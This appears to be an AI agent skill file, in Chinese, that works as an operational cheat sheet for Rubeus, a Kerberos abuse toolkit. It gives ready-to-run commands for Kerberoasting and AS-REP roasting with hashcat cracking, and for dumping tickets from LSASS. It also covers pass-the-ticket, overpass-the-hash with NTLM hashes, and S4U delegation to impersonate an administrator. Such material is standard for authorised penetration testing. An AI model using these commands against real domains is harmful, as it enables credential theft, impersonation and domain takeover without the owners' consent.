---
name: "rubeus"
description: ">"
---

# Rubeus

*Sourced from killvxk-malskills-zh*

# Rubeus

C# Kerberos 滥用工具包 — TGT/TGS 操控、roasting、委派及票据操作。

## 快速开始

```cmd
# AS-REP Roasting（针对未启用预认证的用户）
Rubeus.exe asreproast /format:hashcat

# Kerberoasting（服务账户 TGS）
Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt

# 从内存转储所有票据
Rubeus.exe dump /nowrap
```

## 核心模块

### 票据收集 (Ticket Harvesting)

| 命令 | 说明 |
|------|------|
| `dump` | 从 LSASS 转储票据 |
| `triage` | 列出所有票据 |
| `monitor` | 监控新 TGT（基于时间间隔） |
| `harvest` | 持续收割 TGT |

### 票据请求 (Ticket Requests)

| 命令 | 说明 |
|------|------|
| `asktgt` | 使用密码/哈希/AES 密钥请求 TGT |
| `asktgs` | 为指定服务请求 TGS |
| `renew` | 续期 TGT |

### Roasting

| 命令 | 说明 |
|------|------|
| `asreproast` | AS-REP roasting（预认证已禁用） |
| `kerberoast` | 对注册了 SPN 的账户进行 roasting |
| `brute` | 通过 Kerberos 暴力破解密码 |

### 票据滥用 (Ticket Abuse)

| 命令 | 说明 |
|------|------|
| `ptt` | 票据传递（注入当前会话） |
| `purge` | 从内存清除票据 |
| `describe` | 解析并描述票据 |
| `createnetonly` | 创建牺牲品登录会话 |

### 委派 (Delegation)

| 命令 | 说明 |
|------|------|
| `s4u` | S4U2Self + S4U2Proxy（约束委派） |
| `tgssub` | 替换 TGS 中的 altservice |

## 常用工作流

```cmd
# Kerberoast 所有 SPN → 离线破解
Rubeus.exe kerberoast /format:hashcat /outfile:spns.txt
hashcat -a 0 -m 13100 spns.txt rockyou.txt

# AS-REP roast（转储未启用预认证的用户）
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
hashcat -a 0 -m 18200 asrep.txt rockyou.txt

# 票据传递：导入窃取的票据
Rubeus.exe ptt /ticket:base64_or_file.kirbi
klist  # 验证会话中的票据

# 哈希越权传递：使用 NTLM 哈希获取 TGT
Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# 黄金票据等效：使用 AES 密钥请求 TGT
Rubeus.exe asktgt /user:admin /aes256:AESKEY /domain:corp.local /dc:dc.corp.local /ptt

# 约束委派 S4U
Rubeus.exe s4u /user:service$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt
```

## 资源文件

| 文件 | 加载时机 |
|------|----------|
| `references/kerberos-attacks.md` | 完整 Kerberos 攻击链、委派类型、票据格式及检测说明 |

